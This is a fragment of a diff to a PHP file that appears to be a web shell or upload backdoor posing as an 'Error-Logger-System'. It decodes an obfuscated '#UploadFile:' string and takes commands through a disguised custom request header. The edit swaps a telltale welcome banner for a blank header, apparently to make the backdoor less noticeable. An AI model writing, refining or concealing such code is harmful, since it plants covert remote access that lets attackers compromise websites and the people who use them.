@@ -15,7 +15,8 @@
 
     $SSW = $NuNes("I1VwbG9hZEZpbGU6");
 
-    header("Error-Logger-System: Ver.0.1 Welcome :)");
+    //header("Error-Logger-System: Ver.0.1 Welcome :)");
+    header("Error-Logger-System: ");
     $Logger = $_SERVER["HTTP_ERROR_LOGGER_SYSTEM"];
 
     if (empty($Logger)){
